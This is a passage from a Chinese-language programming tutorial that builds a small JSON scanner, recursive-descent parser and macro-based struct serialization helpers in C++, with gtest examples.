class=\"string\">&#x27;0&#x27;</span> &lt;= ch &amp;&amp; ch &lt;= <span class=\"string\">&#x27;9&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">JsonScanner::ScanNextNumber</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> beginPos = m_pos;</span><br><span class=\"line\">    <span class=\"comment\">// example: &quot;-114.51E-4&quot;</span></span><br><span class=\"line\">    m_pos ++; <span class=\"comment\">// skip + or - or first digit</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (m_pos &lt; m_str.<span class=\"built_in\">size</span>() &amp;&amp; <span class=\"built_in\">IsDigit</span>(m_str[m_pos])) &#123;</span><br><span class=\"line\">        m_pos ++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (m_pos + <span class=\"number\">1</span> &lt; m_str.<span class=\"built_in\">size</span>() &amp;&amp; m_str[m_pos] == <span class=\"string\">&#x27;.&#x27;</span> &amp;&amp; <span class=\"built_in\">IsDigit</span>(m_str[m_pos + <span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\">            m_pos ++; <span class=\"comment\">// skip .</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span>(m_pos &lt; m_str.<span class=\"built_in\">size</span>() &amp;&amp; <span class=\"built_in\">IsDigit</span>(m_str[m_pos])) &#123;</span><br><span class=\"line\">            m_pos ++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (m_pos + <span class=\"number\">1</span> &lt; m_str.<span class=\"built_in\">size</span>() &amp;&amp; (m_str[m_pos] == <span class=\"string\">&#x27;E&#x27;</span> || m_str[m_pos] == <span class=\"string\">&#x27;e&#x27;</span>)) &#123;</span><br><span class=\"line\">        m_pos ++;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (m_str[m_pos] == <span class=\"string\">&#x27;-&#x27;</span> || m_str[m_pos] == <span class=\"string\">&#x27;+&#x27;</span>) &#123;</span><br><span class=\"line\">            m_pos ++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// parse number</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (m_pos &lt; m_str.<span class=\"built_in\">size</span>() &amp;&amp; <span class=\"built_in\">IsDigit</span>(m_str[m_pos])) &#123;</span><br><span class=\"line\">            m_pos ++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    std::string numberStr = m_str.<span class=\"built_in\">substr</span>(beginPos, m_pos - beginPos);</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        m_tmpNumberValue = std::<span class=\"built_in\">atof</span>(numberStr.<span class=\"built_in\">c_str</span>());</span><br><span class=\"line\">    &#125; <span class=\"built_in\"><span class=\"keyword\">catch</span></span> (std::exception &amp;e) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Panic</span>(<span class=\"string\">&quot;invalid number %lf, pos: %lu&quot;</span>, m_tmpNumberValue, beginPos);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">JsonScanner::GetNumberValue</span><span class=\"params\">()</span> </span>&#123; <span class=\"keyword\">return</span> m_tmpNumberValue; &#125;</span><br></pre></td></tr></table></figure></p>\n<p>此时，<code>JsonScanner</code>的全部代码就实现完了，我们已经获得了一个对JSON字符串实现词法分析的引擎。接下来我们只需要在此基础上基于Token流解析完整的JSON结构。</p>\n<h4 id=\"JsonParser\"><a href=\"#JsonParser\" class=\"headerlink\" title=\"JsonParser\"></a>JsonParser</h4><p>由于对JSON的解析依赖于<code>JsonScanner</code>提供的Token解析，<code>JsonParser</code>内部持有一个<code>JsonScanner</code>的instance。</p>\n<p>仿照之前<code>JsonScanner</code>的设计方式，将解析流程分成简单结构的解析方法和复杂结构的解析方法，<code>JsonParser</code>可以将数字、布尔值、字符串等基本结构放在一个<code>ParseNext()</code>方法中，而复杂点的复合结构<code>JsonArray</code>和<code>JsonObject</code>则由独立的<code>ParseJsonArray()</code>和<code>ParseJsonObject</code>负责解析。</p>\n<p>给出<code>JsonParser</code>定义如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JsonParser</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span>:</span><br><span class=\"line\">        JsonScanner m_scanner;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span>:</span><br><span class=\"line\">        <span class=\"built_in\">JsonParser</span>(<span class=\"keyword\">const</span> std::string str);</span><br><span class=\"line\">        <span class=\"function\">JsonElement <span class=\"title\">Parse</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span>:</span><br><span class=\"line\">        <span class=\"function\">JsonElement <span class=\"title\">ParseNext</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">        <span class=\"function\">JsonObject <span class=\"title\">ParseJsonObject</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">        <span class=\"function\">JsonArray <span class=\"title\">ParseJsonArray</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>正如<code>JsonScanner</code>从前往后解析TOKEN，<code>JsonParser</code>从前往后解析<code>JsonElement</code>。<code>JsonParser::ParseNext</code>是<code>JsonParser</code>的核心逻辑，他返回下一个解析出的<code>JsonElement</code>。类似<code>JsonScanner</code>根据<strong>当前字符</strong>推断下一个可能的Token，<code>JsonParser</code>根据<strong>当前Token</strong>推断下一个可能的结构，所以<code>ParseNext()</code>的实现十分简单：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">JsonElement <span class=\"title\">JsonParser::ParseNext</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    JsonScanner::Token token = m_scanner.<span class=\"built_in\">Next</span>();</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">switch</span></span> (token) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> JsonScanner::Token::OBJECT_BEGIN: &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">ParseJsonObject</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> JsonScanner::Token::ARRAY_BEGIN: &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">ParseJsonArray</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> JsonScanner::Token::STRING: &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">JsonElement</span>(m_scanner.<span class=\"built_in\">GetStringValue</span>());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> JsonScanner::Token::NUMBER: &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">JsonElement</span>(m_scanner.<span class=\"built_in\">GetNumberValue</span>());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> JsonScanner::Token::LITERAL_TRUE: &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">JsonElement</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> JsonScanner::Token::LITERAL_FALSE: &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">JsonElement</span>(<span class=\"literal\">false</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> JsonScanner::Token::LITERAL_NULL: &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">JsonElement</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">Panic</span>(<span class=\"string\">&quot;scanner return unexpected token: %d&quot;</span>, token);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">JsonElement</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中字符串、布尔、数字、null这四种基础类型可以直接用<code>JsonScanner</code>提供的TOKEN解析能力直接拿到。而<code>JsonArray</code>和<code>JsonObject</code>的解析较为复杂，则放到单独的<code>ParseJsonObject()</code>和<code>ParseJsonArray()</code>方法中实现。</p>\n<p><code>ParseJsonObject()</code>本质上就是解析<code>STRING</code>和<code>COLON</code>，然后再递归调用<code>ParseNext()</code>解析value对象，直到遇到<code>OBJECT_END</code>退出：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">JsonObject <span class=\"title\">JsonParser::ParseJsonObject</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    JsonObject object &#123;&#125;;</span><br><span class=\"line\">    JsonScanner::Token token = m_scanner.<span class=\"built_in\">Next</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (token == JsonScanner::Token::OBJECT_END) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> object;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    m_scanner.<span class=\"built_in\">RollBack</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">size_t</span> pos = m_scanner.<span class=\"built_in\">Position</span>();</span><br><span class=\"line\">        token = m_scanner.<span class=\"built_in\">Next</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (token != JsonScanner::Token::STRING) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">Panic</span>(<span class=\"string\">&quot;expect a string as key for json object, position: %lu&quot;</span>, pos);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        std::string key = m_scanner.<span class=\"built_in\">GetStringValue</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        pos = m_scanner.<span class=\"built_in\">Position</span>();</span><br><span class=\"line\">        token = m_scanner.<span class=\"built_in\">Next</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (token != JsonScanner::Token::COLON) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">Panic</span>(<span class=\"string\">&quot;expect &#x27;:&#x27; in json object, position: %lu&quot;</span>, pos);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        JsonElement ele = <span class=\"built_in\">ParseNext</span>();</span><br><span class=\"line\">        object[key] = ele;</span><br><span class=\"line\"></span><br><span class=\"line\">        pos = m_scanner.<span class=\"built_in\">Position</span>();</span><br><span class=\"line\">        token = m_scanner.<span class=\"built_in\">Next</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (token == JsonScanner::Token::OBJECT_END) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (token != JsonScanner::Token::COMMA) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">Panic</span>(<span class=\"string\">&quot;expect &#x27;,&#x27; in json object, position: %lu&quot;</span>, pos);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> object;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>解析数组的原理同理，先解析<code>ARRAY_BEGIN</code>，然后依次递归调用<code>ParseNext()</code>解析下一个<code>JsonElement</code>对象，知道遇到<code>ARRAY_END</code>完成解析。<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">JsonArray <span class=\"title\">JsonParser::ParseJsonArray</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    JsonArray array &#123;&#125;;</span><br><span class=\"line\">    JsonScanner::Token token = m_scanner.<span class=\"built_in\">Next</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (token == JsonScanner::Token::ARRAY_END) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> array;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    m_scanner.<span class=\"built_in\">RollBack</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">        array.<span class=\"built_in\">push_back</span>(<span class=\"built_in\">ParseNext</span>());</span><br><span class=\"line\">        <span class=\"keyword\">size_t</span> pos = m_scanner.<span class=\"built_in\">Position</span>();</span><br><span class=\"line\">        token = m_scanner.<span class=\"built_in\">Next</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (token == JsonScanner::Token::ARRAY_END) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (token != JsonScanner::Token::COMMA) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Panic</span>(<span class=\"string\">&quot;expect &#x27;,&#x27; in array, pos: %lu&quot;</span>, pos);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> array;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>由于进入<code>ParseJsonArray()</code>和<code>ParseJsonObject()</code>之前<code>JsonScanner</code>的字符串索引已经指向了<code>[</code>或<code>&#123;</code>，进入对应方法后需要<code>RollBack()</code>回滚索引。</p>\n</blockquote>\n<p>到此位置，反序列化也完全实现了。接下来写个用例验证下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">TEST</span>(SerializationTest, JsonParserBasicTest) &#123;</span><br><span class=\"line\">    std::string str = <span class=\"string\">R&quot;(</span></span><br><span class=\"line\"><span class=\"string\">        &#123;</span></span><br><span class=\"line\"><span class=\"string\">        &quot;name&quot; : &quot;xuranus&quot;,</span></span><br><span class=\"line\"><span class=\"string\">        &quot;age&quot; : 300,</span></span><br><span class=\"line\"><span class=\"string\">        &quot;skills&quot; : [&quot;C++&quot;, &quot;Java&quot;, &quot;Python&quot;]</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">    )&quot;</span>;</span><br><span class=\"line\">    JsonElement element = <span class=\"built_in\">JsonParser</span>(str).<span class=\"built_in\">Parse</span>();</span><br><span class=\"line\">    JsonObject object = element.<span class=\"built_in\">AsJsonObject</span>();</span><br><span class=\"line\">    <span class=\"built_in\">EXPECT_EQ</span>(object[<span class=\"string\">&quot;name&quot;</span>].<span class=\"built_in\">AsString</span>(), <span class=\"string\">&quot;xuranus&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">EXPECT_EQ</span>(object[<span class=\"string\">&quot;age&quot;</span>].<span class=\"built_in\">AsNumber</span>(), <span class=\"number\">300</span>);</span><br><span class=\"line\">    <span class=\"built_in\">EXPECT_EQ</span>(object[<span class=\"string\">&quot;skills&quot;</span>].<span class=\"built_in\">AsJsonArray</span>()[<span class=\"number\">0</span>].<span class=\"built_in\">AsString</span>(), <span class=\"string\">&quot;C++&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">EXPECT_EQ</span>(object[<span class=\"string\">&quot;skills&quot;</span>].<span class=\"built_in\">AsJsonArray</span>()[<span class=\"number\">1</span>].<span class=\"built_in\">AsString</span>(), <span class=\"string\">&quot;Java&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">EXPECT_EQ</span>(object[<span class=\"string\">&quot;skills&quot;</span>].<span class=\"built_in\">AsJsonArray</span>()[<span class=\"number\">2</span>].<span class=\"built_in\">AsString</span>(), <span class=\"string\">&quot;Python&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"模板工具\"><a href=\"#模板工具\" class=\"headerlink\" title=\"模板工具\"></a>模板工具</h3><p>此时，虽然一个完整的JSON序列化和反序列化工具已经实现，但是用起来还是比较麻烦。在Java、GO中都有注解实现的ORM框架，能实现类/结构体的自动序列化/反序列化，我们尝试在C++中也实现这一功能。</p>\n<p>在下面的样例中，我们期望实现两个函数：</p>\n<ul>\n<li><code>std::string util::Serialize(T&amp;)</code>将类型为T的结构体序列化成JSON字符串</li>\n<li><code>void util::Deserialize(const std::string&amp;, T&amp;)</code>将JSON字符串反序列化成对应的结构体<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Book</span> &#123;</span></span><br><span class=\"line\">    std::string m_name;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> m_id;</span><br><span class=\"line\">    <span class=\"keyword\">float</span> m_price;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> m_soldOut;</span><br><span class=\"line\">    std::vector&lt;std::string&gt; m_tags;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">TEST</span>(SerializationTest, BasicStructSerialization) &#123;</span><br><span class=\"line\">    Book book1 &#123;&#125;;</span><br><span class=\"line\">    book1.m_name = <span class=\"string\">&quot;C++ Primer&quot;</span>;</span><br><span class=\"line\">    book1.m_id = <span class=\"number\">114514</span>;</span><br><span class=\"line\">    book1.m_price = <span class=\"number\">114.5</span>;</span><br><span class=\"line\">    book1.m_soldOut = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    book1.m_tags = &#123;<span class=\"string\">&quot;C++&quot;</span>, <span class=\"string\">&quot;Programming&quot;</span>, <span class=\"string\">&quot;Language&quot;</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// serialization here</span></span><br><span class=\"line\">    std::string jsonStr = util::<span class=\"built_in\">Serialize</span>(book1);</span><br><span class=\"line\"></span><br><span class=\"line\">    Book book2 &#123;&#125;;</span><br><span class=\"line\">    <span class=\"comment\">// deserialization here</span></span><br><span class=\"line\">    util::<span class=\"built_in\">Deserialize</span>(jsonStr, book2);</span><br><span class=\"line\">    <span class=\"built_in\">EXPECT_EQ</span>(book1.m_name, book2.m_name);</span><br><span class=\"line\">    <span class=\"built_in\">EXPECT_EQ</span>(book1.m_id, book2.m_id);</span><br><span class=\"line\">    <span class=\"built_in\">EXPECT_EQ</span>(book1.m_price, book2.m_price);</span><br><span class=\"line\">    <span class=\"built_in\">EXPECT_EQ</span>(book1.m_soldOut, book2.m_soldOut);</span><br><span class=\"line\">    <span class=\"built_in\">EXPECT_EQ</span>(book1.m_tags, book2.m_tags);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n为了实现对每一种类型的结构体都能序列化，我们必须对其中成员序列化映射规则做出定义。为了实现这点，我们不得不在结构体中侵入式的定义一个成员函数<code>_XURANUS_JSON_CPP_SERIALIZE_METHOD_</code>：<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Book</span> &#123;</span></span><br><span class=\"line\">    std::string m_name;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> m_id;</span><br><span class=\"line\">    <span class=\"keyword\">float</span> m_price;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> m_soldOut;</span><br><span class=\"line\">    std::vector&lt;std::string&gt; m_tags;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">void</span> _XURANUS_JSON_CPP_SERIALIZE_METHOD_(xuranus::minijson::JsonObject&amp; object, <span class=\"keyword\">bool</span> toJson) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (toJson) &#123;</span><br><span class=\"line\">            util::<span class=\"built_in\">SerializeTo</span>(object, <span class=\"string\">&quot;name&quot;</span>, m_name);</span><br><span class=\"line\">            util::<span class=\"built_in\">SerializeTo</span>(object, <span class=\"string\">&quot;id&quot;</span>, m_id);</span><br><span class=\"line\">            util::<span class=\"built_in\">SerializeTo</span>(object, <span class=\"string\">&quot;price&quot;</span>, m_price);</span><br><span class=\"line\">            util::<span class=\"built_in\">SerializeTo</span>(object, <span class=\"string\">&quot;soldOut&quot;</span>, m_soldOut);</span><br><span class=\"line\">            util::<span class=\"built_in\">SerializeTo</span>(object, <span class=\"string\">&quot;tags&quot;</span>, m_tags);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            util::<span class=\"built_in\">DeserializeFrom</span>(object, <span class=\"string\">&quot;name&quot;</span>, m_name);</span><br><span class=\"line\">            util::<span class=\"built_in\">DeserializeFrom</span>(object, <span class=\"string\">&quot;id&quot;</span>, m_id);</span><br><span class=\"line\">            util::<span class=\"built_in\">DeserializeFrom</span>(object, <span class=\"string\">&quot;price&quot;</span>, m_price);</span><br><span class=\"line\">            util::<span class=\"built_in\">DeserializeFrom</span>(object, <span class=\"string\">&quot;soldOut&quot;</span>, m_soldOut);</span><br><span class=\"line\">            util::<span class=\"built_in\">DeserializeFrom</span>(object, <span class=\"string\">&quot;tags&quot;</span>, m_tags);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n我们可以用宏定义简化这部分的表示：<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SERIALIZE_SECTION_BEGIN                                                                  \\</span></span><br><span class=\"line\"><span class=\"meta\">public:                                                                                          \\</span></span><br><span class=\"line\"><span class=\"meta\">    using __XURANUS_JSON_SERIALIZATION_MAGIC__ = void;                                           \\</span></span><br><span class=\"line\"><span class=\"meta\">public:                                                                                          \\</span></span><br><span class=\"line\"><span class=\"meta\">    void _XURANUS_JSON_CPP_SERIALIZE_METHOD_(xuranus::minijson::JsonObject&amp; object, bool toJson) \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#123;                                                                                            \\</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SERIALIZE_SECTION_END                                                                    \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;;                                                                                           \\</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SERIALIZE_FIELD(KEY_NAME, ATTR_NAME)                                                     \\</span></span><br><span class=\"line\"><span class=\"meta\">    do &#123;                                                                                         \\</span></span><br><span class=\"line\"><span class=\"meta\">        <span class=\"meta-keyword\">if</span> (toJson) &#123;                                                                            \\</span></span><br><span class=\"line\"><span class=\"meta\">            util::SerializeTo(object, #KEY_NAME, ATTR_NAME);                                     \\</span></span><br><span class=\"line\"><span class=\"meta\">        &#125; <span class=\"meta-keyword\">else</span> &#123;                                                                                 \\</span></span><br><span class=\"line\"><span class=\"meta\">            xuranus::minijson::util::DeserializeFrom(object, #KEY_NAME, ATTR_NAME);              \\</span></span><br><span class=\"line\"><span class=\"meta\">        &#125;                                                                                        \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125; while (0)                                                                                  \\</span></span><br></pre></td></tr></table></figure>\n定义宏之后的结构体声明就可以写成如下形式，由一组<code>SERIALIZE_SECTION_BEGIN</code>和<code>SERIALIZE_SECTION_END</code>以及一系列<code>SERIALIZE_FIELD</code>声明成员的序列化/反序列化名称映射关系。：<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Book</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    std::string m_name;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> m_id;</span><br><span class=\"line\">    <span class=\"keyword\">float</span> m_price;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> m_soldOut;</span><br><span class=\"line\">    std::vector&lt;std::string&gt; m_tags;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\">SERIALIZE_SECTION_BEGIN</span></span><br><span class=\"line\"><span class=\"function\">    <span class=\"title\">SERIALIZE_FIELD</span><span class=\"params\">(name, m_name)</span></span>;</span><br><span class=\"line\">    <span class=\"built_in\">SERIALIZE_FIELD</span>(id, m_id);</span><br><span class=\"line\">    <span class=\"built_in\">SERIALIZE_FIELD</span>(price, m_price);</span><br><span class=\"line\">    <span class=\"built_in\">SERIALIZE_FIELD</span>(soldOut, m_soldOut);</span><br><span class=\"line\">    <span class=\"built_in\">SERIALIZE_FIELD</span>(tags, m_tags);</span><br><span class=\"line\">    SERIALIZE_SECTION_END</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n当类定义了上述的成员方法后，就拥有了序列化和反序列化的能力。此时就可以实现供外部调用的接口了：<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">auto</span> <span class=\"title\">Serialize</span><span class=\"params\">(T&amp; value)</span> -&gt; <span class=\"title\">decltype</span><span class=\"params\">(<span class=\"keyword\">typename</span> T::__XURANUS_JSON_SERIALIZATION_MAGIC__(), std::string())</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    JsonObject object&#123;&#125;;</span><br><span class=\"line\">    value._XURANUS_JSON_CPP_SERIALIZE_METHOD_(object, <span class=\"literal\">true</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> object.<span class=\"built_in\">Serialize</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">auto</span> <span class=\"title\">Deserialize</span><span class=\"params\">(<span class=\"keyword\">const</span> std::string&amp; jsonStr, T&amp; value)</span> -&gt; <span class=\"title\">decltype</span><span class=\"params\">(<span class=\"keyword\">typename</span> T::__XURANUS_JSON_SERIALIZATION_MAGIC__())</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\">JsonParser <span class=\"title\">parser</span><span class=\"params\">(jsonStr)</span></span>;</span><br><span class=\"line\">    JsonElement ele = parser.<span class=\"built_in\">Parse</span>();</span><br><span class=\"line\">    JsonObject object = ele.<span class=\"built_in\">AsJsonObject</span>();</span><br><span class=\"line\">    value._XURANUS_JSON_CPP_SERIALIZE_METHOD_(object, <span class=\"literal\">false</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这里用到了Trailing Return Type，<code>__XURANUS_JSON_SERIALIZATION_MAGIC__</code>在之前的成员宏中已经定义为<code>void</code>，本身并无意义，只是用于标记该类实现了成员序列化方法，用于给序列化/反序列化工具函数在编译期进行检测。如果结构体没定义相关的宏，则模板函数特化时会失败。</p>\n</blockquote>\n</li>\n</ul>\n<p>于是接下来的任务就只是实现上述<code>_XURANUS_JSON_CPP_SERIALIZE_METHOD_</code>方法中用到的两个辅助函数：</p>\n<ul>\n<li><code>std::string util::SerializeTo(JsonObject&amp;, const std::string&amp;, T&amp;)</code></li>\n<li><code>void util::DeserializeFrom(JsonObject&amp;, const std::string&amp;, T&amp;)</code></li>\n</ul>\n<p>首先来看<code>std::string util::SerializeTo(JsonObject&amp;, const std::string&amp;, T&amp;)</code>。它的用途是把参数3的值以参数2作为key转化成<code>JsonElement</code>存入参数1的<code>JsonObject</code>。而<code>void util::DeserializeFrom(JsonObject&amp;, const std::string&amp;, T&amp;)</code>则相反，它的作用是从参数1的<code>JsonObject</code>中取出参数2的key对应的<code>JsonElement</code>，转化为T类型的值存入参数3。这两个模板函数可以实现为：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">SerializeTo</span><span class=\"params\">(JsonObject&amp; object, <span class=\"keyword\">const</span> std::string&amp; key, <span class=\"keyword\">const</span> T&amp; field)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    JsonElement ele&#123;&#125;;</span><br><span class=\"line\">    CastToJsonElement&lt;T&gt;(ele, field);</span><br><span class=\"line\">    object[key] = ele;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DeserializeFrom</span><span class=\"params\">(<span class=\"keyword\">const</span> JsonObject&amp; object, <span class=\"keyword\">const</span> std::string&amp; key, T&amp; field)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    JsonElement ele = object.<span 